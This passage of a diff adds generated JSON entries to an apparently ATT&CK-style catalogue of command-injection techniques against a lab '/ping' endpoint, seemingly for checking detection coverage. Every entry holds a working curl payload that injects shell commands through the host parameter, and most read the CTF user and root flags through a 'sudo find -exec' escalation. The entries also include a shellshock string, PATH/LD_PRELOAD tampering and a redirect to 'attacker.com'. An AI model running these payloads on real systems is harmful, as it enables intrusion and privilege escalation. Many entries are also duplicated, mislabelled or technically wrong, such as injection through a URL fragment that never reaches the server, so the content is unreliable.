+    "name": "Command Injection with Sudo Misuse via Shellshock Exploit",
+    "description": "Exploit a shellshock vulnerability to execute arbitrary commands via environment variables, bypassing standard command injection detection.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unusual environment variable manipulation or unexpected command execution in logs"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=$(echo '() { :; }; echo;/bin/sh')\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.941": {
+    "name": "Command Injection with Base64 Encoding",
+    "description": "Encodes malicious commands in base64 to bypass simple signature detection, leveraging the existing /ping endpoint for command execution as user 'ctf'.",
+    "tactics": [
+      "initial-access"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Base64 encoded payload in HTTP request to /ping endpoint with unexpected command output"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=$(echo 'id;cat /home/ctf/user.txt' | base64)\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "initial-access"
+  },
+  "T1190.942": {
+    "name": "Command Injection with Base64 Encoding",
+    "description": "Encodes malicious commands in base64 to bypass simple regex checks, leveraging the existing /ping endpoint for command execution as user 'ctf'.",
+    "tactics": [
+      "execution"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing base64 decoding and execution of commands with elevated privileges via sudo"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=$(echo ';sudo find /etc/hostname -exec cat /root/root.txt \\;' | base64)\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "execution"
+  },
+  "T1190.943": {
+    "name": "Command Injection via URL Fragment with Sudo Escalation",
+    "description": "Exploits the URL fragment to inject a command that triggers sudo execution, leveraging the existing RCE in /ping to escalate privileges.",
+    "tactics": [
+      "initial-access"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing sudo execution and unexpected file access from /root/"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "initial-access"
+  },
+  "T1190.944": {
+    "name": "Command Injection with Sudo Misuse via Shell Argument Chain",
+    "description": "Exploit the command injection vulnerability in the /ping endpoint to chain sudo execution through shell arguments, bypassing simple filtering by using shell syntax to execute multiple commands and leverage sudo privileges.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing sudo execution of find with unexpected arguments or access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.945": {
+    "name": "Command Injection via URL Fragment with Sudo Escalation",
+    "description": "Exploits the URL fragment to inject a command that executes with sudo privileges by leveraging the existing sudo permissions of the 'ctf' user. This bypasses basic input sanitization by using a fragment identifier which is often overlooked in URL parsing.",
+    "tactics": [
+      "initial-access"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unexpected sudo command execution in web server logs or unexpected file access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=#$(echo 'sudo find /etc/hostname -exec cat /root/root.txt \\;')\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "initial-access"
+  },
+  "T1190.946": {
+    "name": "Command Injection with Sudo NOPASSWD Abuse",
+    "description": "Exploit the NOPASSWD sudo rule to execute commands as root without password, leveraging the already injectable ping endpoint to trigger a sudo command that reads the root flag.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Sudo command execution in system logs with elevated privileges, specifically 'find /etc/hostname -exec cat /root/root.txt \\;'"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.947": {
+    "name": "Command Injection with Sudo Misuse via Environment Variable Chain",
+    "description": "Exploit the environment variable chain to trigger sudo find command with crafted variables to read the root flag.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unexpected execution of sudo find with modified environment variables in logs"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;export PATH=/tmp;export LD_PRELOAD=/tmp/fake.so;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.948": {
+    "name": "Command Injection with Sudo Misuse via Shell Argument Chain",
+    "description": "Exploit the existing sudo privilege to execute a command chain that leverages shell argument parsing to bypass filters and execute arbitrary commands.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing sudo execution of find with cat command on /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.949": {
+    "name": "Command Injection via URL Fragment with Sudo Escalation",
+    "description": "Exploits the URL fragment to inject commands, leveraging the existing sudo privileges to escalate to root. The fragment is not parsed by the server, allowing command injection without URL encoding.",
+    "tactics": [
+      "initial-access"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unusual sudo command execution in logs, unexpected file access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping#host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;'",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "initial-access"
+  },
+  "T1190.950": {
+    "name": "Command Injection with Sudo Misuse via Shell Argument Chain",
+    "description": "Exploit the existing sudo permissions to chain commands using shell arguments to bypass restrictions, leveraging the already known sudo access to escalate privileges and read the root flag.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing sudo command execution with 'find' and 'cat' commands on /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.951": {
+    "name": "Command Injection with Sudo Misuse via Shell Argument Chain",
+    "description": "Exploit the existing sudo permission for 'ctf' to run 'find' as root by chaining shell arguments to bypass restrictions on the 'find' command, leveraging the existing RCE in /ping.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing 'sudo find' executed with access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo\\ find\\ /etc/hostname\\ -exec\\ cat\\ /root/root.txt\\ \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.952": {
+    "name": "Command Injection with Sudo Misuse via Shell Argument Chain",
+    "description": "Exploit the existing command injection in /ping to chain sudo via shell arguments, bypassing restrictions by using environment variables to inject sudo commands.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing unexpected sudo usage or execution of find with cat on /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;env X='sudo find /etc/hostname -exec cat /root/root.txt \\;'\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.953": {
+    "name": "Command Injection with Sudo Escalation",
+    "description": "Exploit the RCE in the ping endpoint to execute a sudo command that leverages the NOPASSWD rule to read the root flag directly.",
+    "tactics": [
+      "privilege-escalation"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing sudo command execution with user 'ctf' and access to /root/root.txt"
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "privilege-escalation"
+  },
+  "T1190.954": {
+    "name": "Command Injection with Base64 Encoding",
+    "description": "Encodes malicious command in base64 to bypass simple string-based filters, leveraging the existing /ping endpoint for command execution.",
+    "tactics": [
+      "execution"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing base64 decoding and execution of shell commands, potentially with unexpected output from the ping utility."
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=$(echo 'id;cat /home/ctf/user.txt' | base64)\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "execution"
+  },
+  "T1190.955": {
+    "name": "Command Injection with Sudo Privilege Escalation",
+    "description": "Exploits the sudo access of the 'ctf' user to read the root flag by chaining command injection with sudo execution.",
+    "tactics": [
+      "execution"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs indicating sudo execution and access to /root/root.txt, with unexpected output from the ping utility."
+      }
+    ],
+    "command": "curl -s -G 'http://172.31.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;sudo find /etc/hostname -exec cat /root/root.txt \\;\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "execution"
+  },
+  "T1190.956": {
+    "name": "Encoded Command Injection with Base64 Payload",
+    "description": "Inject a base64-encoded command to bypass simple payload filters, leveraging the command injection vulnerability to execute arbitrary commands on the target system.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing base64-encoded data being passed to a command interpreter or unexpected base64 output in the application response."
+      }
+    ],
+    "command": "curl -s -G 'http://172.32.10.20:8080/ping' --data-urlencode \"host=$(echo ';cat /home/ctf/user.txt' | base64)\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.957": {
+    "name": "Command Injection via HTTP Header Manipulation",
+    "description": "Inject a command through an HTTP header rather than the query parameter, exploiting potential misconfigurations in how headers are parsed and executed.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unusual HTTP headers containing semicolons or command execution strings, or unexpected output in the server logs related to header parsing."
+      }
+    ],
+    "command": "curl -s -H 'Host: 127.0.0.1;id' http://172.32.10.20:8080/ping",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.958": {
+    "name": "Command Injection via Base64 Encoding",
+    "description": "Encodes the malicious command in Base64 to bypass simple string-based filters, leveraging the existing command injection vulnerability to execute arbitrary code.",
+    "tactics": [
+      "resource-development"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing base64 encoded payloads being processed by the web application"
+      }
+    ],
+    "command": "curl -s -G 'http://172.32.10.10:8080/ping' --data-urlencode 'host=VmFsb25lLmNvbS9yZWFsbXZhbHVlL2RlZmVlbW9yZS9kZWNvZGU='",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "resource-development"
+  },
+  "T1190.959": {
+    "name": "Command Injection via HTTP Headers",
+    "description": "Injects the command into HTTP headers instead of the query parameter to avoid detection by signature-based filters that focus on query strings.",
+    "tactics": [
+      "resource-development"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unusual Host headers in HTTP requests that contain command injection payloads"
+      }
+    ],
+    "command": "curl -s -H 'Host: 127.0.0.1;id' http://172.32.10.10:8080/ping",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "resource-development"
+  },
+  "T1190.960": {
+    "name": "Command Injection via JSON Payload",
+    "description": "Inject a command into a JSON payload to bypass encoding and header-based filters, leveraging the application's parsing logic to execute arbitrary commands.",
+    "tactics": [
+      "resource-development"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unusual JSON payload with command injection patterns in the 'host' field"
+      }
+    ],
+    "command": "curl -s -X POST 'http://172.32.10.10:8080/ping' -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1;id\"}'",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "resource-development"
+  },
+  "T1190.961": {
+    "name": "Command Injection via URL Fragment",
+    "description": "Exploit the URL fragment to inject commands, as it is often not properly sanitized, allowing execution of arbitrary commands without triggering typical injection filters.",
+    "tactics": [
+      "resource-development"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Presence of command injection in URL fragment with 'host' parameter"
+      }
+    ],
+    "command": "curl -s 'http://172.32.10.10:8080/ping#host=127.0.0.1;id'",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "resource-development"
+  },
+  "T1190.962": {
+    "name": "Command Injection with Base64 Encoded Payload",
+    "description": "Injects a base64 encoded payload into the host parameter to bypass simple encoding checks and execute arbitrary commands.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs showing base64 encoded data in the host parameter or unexpected command execution output."
+      }
+    ],
+    "command": "curl -s -G 'http://172.32.10.20:8080/ping' --data-urlencode \"host=$(echo 'id' | base64)\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.963": {
+    "name": "Command Injection with JSON Payload",
+    "description": "Uses a JSON payload to inject commands, leveraging the structure to bypass some input validation mechanisms.",
+    "tactics": [
+      "reconnaissance"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Logs containing JSON format in the host parameter or unexpected command execution output."
+      }
+    ],
+    "command": "curl -s -G 'http://172.32.10.20:8080/ping' --data-urlencode \"host={\"host\":\"id\"}\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "reconnaissance"
+  },
+  "T1190.964": {
+    "name": "Command Injection via JSONP Callback",
+    "description": "Exploits JSONP callback parameter to inject commands by embedding malicious payloads within a JSONP response, bypassing typical input validation mechanisms.",
+    "tactics": [
+      "resource-development"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unusual JSONP callback parameters in HTTP requests with embedded command execution attempts."
+      }
+    ],
+    "command": "curl -s -G 'http://172.32.10.20:8080/ping' --data-urlencode \"host=127.0.0.1;id\" --data-urlencode \"callback=alert('x')\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "resource-development"
+  },
+  "T1190.965": {
+    "name": "Command Injection via HTTP Redirect",
+    "description": "Uses HTTP redirect to inject commands by manipulating the Location header to point to a malicious endpoint that executes commands on the target system.",
+    "tactics": [
+      "resource-development"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unexpected HTTP redirects with suspicious payloads in the Location header."
+      }
+    ],
+    "command": "curl -s -G 'http://172.32.10.20:8080/ping' --data-urlencode \"host=127.0.0.1;id\" --data-urlencode \"redirect=http://attacker.com/evil\"",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "resource-development"
+  },
+  "T1190.966": {
+    "name": "Command Injection via WebSocket Upgrade",
+    "description": "Exploit the WebSocket upgrade mechanism to bypass traditional payload restrictions and inject commands through the upgrade handshake, leveraging the underlying HTTP connection for command execution.",
+    "tactics": [
+      "resource-development"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "Unusual WebSocket upgrade requests with injected command strings in headers or payload"
+      }
+    ],
+    "command": "curl -s -G 'http://172.32.10.10:8080/ping' --data-urlencode \"host=127.0.0.1;id\" --header 'Upgrade: WebSocket' --header 'Connection: Upgrade'",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "resource-development"
+  },
+  "T1190.967": {
+    "name": "Command Injection via HTTP/2 ALPN Negotiation",
+    "description": "Use HTTP/2 ALPN (Application-Layer Protocol Negotiation) to inject command strings during protocol negotiation, bypassing standard payload validation mechanisms.",
+    "tactics": [
+      "resource-development"
+    ],
+    "platforms": [
+      "Linux",
+      "Containers"
+    ],
+    "detection_strategies": [
+      {
+        "name": "HTTP/2 requests with ALPN values containing command strings or unusual protocol negotiation attempts"
+      }
+    ],
+    "command": "curl -s --http2 --alpn 'http/1.1;websocket;127.0.0.1;id' http://172.32.10.10:8080/ping",
+    "wazuh_covered": false,
+    "generated": true,
+    "origin_stage": "resource-development"
+  }
+}
